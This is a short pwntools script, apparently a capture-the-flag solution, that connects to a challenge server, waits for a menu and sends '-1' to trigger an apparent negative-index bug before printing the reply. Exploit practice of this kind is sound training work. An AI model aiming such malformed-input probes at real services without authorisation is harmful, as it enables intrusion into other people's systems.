from pwn import *

exe = context.binary = ELF('menu')

io = remote('chall.pwnoh.io', 13371)
io.recvuntil(b'4: Quit\n')
io.sendline(b'-1')

print(io.recvline())